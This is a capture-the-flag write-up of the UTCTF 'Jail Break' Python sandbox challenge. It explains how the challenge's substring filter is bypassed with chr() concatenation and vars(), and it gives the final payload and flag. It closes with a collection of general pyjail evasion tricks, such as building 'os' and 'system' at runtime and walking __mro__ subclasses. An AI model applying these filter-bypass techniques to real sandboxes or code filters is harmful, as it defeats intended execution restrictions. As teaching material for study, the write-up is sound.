---
title: "[UTCTF] Jail Break writeup"
published: 2026-03-15
description: An analysis of the UTCTF Python sandbox and filter bypass.
category: CTF
tags: [CTF, writeup, pyjail, utctf]
draft: false
---
# UTCTF - Jail Break 

## Problem Overview

- **Category**: Misc (Python Jail)
- **Topic**: Python sandbox escape + keyword filter bypass

### Problem file (`jail.py`)

Just looking at the core structure:

```python
_ENC = [0x37, 0x36, 0x24,...]
_KEY = 0x42

def _secret():
    return ''.join(chr(b ^ _KEY) for b in _ENC)

BANNED = [
    "import", "os", "sys", "system", "eval",
    "open", "read", "write", "subprocess", "pty",
    "popen", "secret", "_enc", "_key"
]

SAFE_BUILTINS = {
    "print": print, "vars": vars, "getattr": getattr,
    "chr": chr, "dir": dir,...  # globals/exec/eval etc. Hazard function removal
}

GLOBALS = {"__builtins__": SAFE_BUILTINS, "_secret": _secret}

while True:
    code = input(">>> ")
    for word in BANNED:
        if word.lower() in code.lower():   # Check input string
            print("[BLOCKED]")
    exec(compile(code, "<jail>", "exec"), GLOBALS)
```
---

## analyze

### Step 1: Where is the flag?

The `_secret()` function XORs the `_ENC` array into `_KEY(0x42)`.
And this function is registered as `"_secret": _secret` in `GLOBALS`
That is, if `_secret()` can be called from inside the jail, the flag

### Step 2: Why cannot I make a direct call?

`BANNED` list includes `"secret"`
The filter checks **the entire input string** with `word in code.lower()`,
If there is a substring named `secret` somewhere in the input, it will be blocked unconditionally.

```
>>> _secret()          # BLOCKED - 'secret' include
>>> _secret            # BLOCKED - 'secret' include
>>> vars()['_secret']  # BLOCKED - 'secret' include
>>> '_' + 'secret'     # BLOCKED - 'secret' include
```

### Step 3: How to bypass the filter

The filter checks **source code strings**, not **strings created at runtime**.

In other words, it can be bypassed by combining characters with `chr()` and creating the string `_secret` **at runtime**.

```
'_secret' = chr(95) + 'se' + 'cret'
```

- `chr(95)` = `_` (underscore)
- `'se'` = `s`, `e` (each not in BANNED)
- `'cret'` = `c`, `r`, `e`, `t` (each not in BANNED)

At the time of the check, there is no `secret` in the source string, so it passes.
At execution time, `chr(95)+'se'+'cret'` = `_secret` is created.

### Step 4: Access GLOBALS with vars()

`SAFE_BUILTINS` to `vars` is allowed
`vars()` returns the namespace of the current execution context as a dict,
It runs as `exec(code, GLOBALS)`, so `vars()` soon becomes `GLOBALS`

```python
vars()['_secret']   # == GLOBALS['_secret'] == _secret function
vars()['_secret']() # == _secret() call
```

---

## Final payload

```python
print(vars()[chr(95)+'se'+'cret']())
```

To disassemble:
1. `chr(95)` → `'_'`
2. `chr(95)+'se'+'cret'` → `'_secret'` (combination at runtime)
3. `vars()['_secret']` → `_secret` function object
4. `vars()['_secret']()` → Call `_secret()` --> Return flag
5. `print(...)` → Output

### Check filter passes

```python
BANNED = ['import','os','sys','system','eval','open','read',
          'write','subprocess','pty','popen','secret','_enc','_key']

payload = "print(vars()[chr(95)+'se'+'cret']())"
blocked = any(word in payload.lower() for word in BANNED)
# blocked = False  ← passing!
```

---

## Execution result

```
==================================================
  Welcome to PyJail v1.0
  Escape to get the flag!
==================================================

>>> print(vars()[chr(95)+'se'+'cret']())
utflag{py_ja1l_3sc4p3_m4st3r}
```

---

## FLAG

```
utflag{py_ja1l_3sc4p3_m4st3r}
```

---

## Bonus: If you could read the file directly

If you can directly access the `jail.py` source code without a server,
Calculate `_ENC` and `_KEY` as is

```python
_ENC = [0x37, 0x36, 0x24, 0x2e, 0x23, 0x25, 0x39, 0x32, 0x3b, 0x1d,
        0x28, 0x23, 0x73, 0x2e, 0x1d, 0x71, 0x31, 0x21, 0x76, 0x32,
        0x71, 0x1d, 0x2f, 0x76, 0x31, 0x36, 0x71, 0x30, 0x3f]
_KEY = 0x42
print(''.join(chr(b ^ _KEY) for b in _ENC))
# utflag{py_ja1l_3sc4p3_m4st3r}
```

---

## Summary of key points

| Item | Content |
|---|---|
| flag location | `GLOBALS['_secret']()` call result |
| Filter method | Check banned word **substring** in input string |
| Filter Bypass | `chr()` + keyword combination at runtime with string splitting |
| namespace access | `vars()` → Return `GLOBALS` dict → Access function with key `['_secret']` |
| Key Lessons | Source string filter can be bypassed with **runtime string generation** |

---

## PyJail Collection of common evasion techniques

### 1. `chr()` combination

```python
# 'os' detour
__import__(chr(111)+chr(115))           # chr(111)='o', chr(115)='s'
```

### 2. Split string

```python
# 'system' detour
'sys'+'tem'
's'+'y'+'s'+'t'+'e'+'m'
```

### 3. `__class__.__mro__` chain (restore builtins)

```python
# object → Access risk classes with subclass navigation
().__class__.__mro__[-1].__subclasses__()
```

### 4. Utilizing `getattr`

```python
# Construct the attribute name as a string to bypass the filter.
getattr(some_obj, 'dange'+'rous_method')()
```

### 5. Utilize `f-string` or `format`

```python
# Runtime string generation
f"{'sec'+'ret'}"
```

---

## Study more related concepts

- **Python Sandbox Escape**: Understanding `__builtins__`, `__class__`, `__mro__` chains
- **SSTI (Server-Side Template Injection)**: Similar runtime escape concept.
- **AST-based filter**: More powerful filter than string check, node check after `ast.parse()`

This review was written by `GPT`.

There were two possible solutions, and I came across this problem while looking at cryptography problems.
The only thing that came to mind was the XOR approach, so I solved it that way and came up with a new solution while writing the review.
So, you can say that you have come to know Inten.
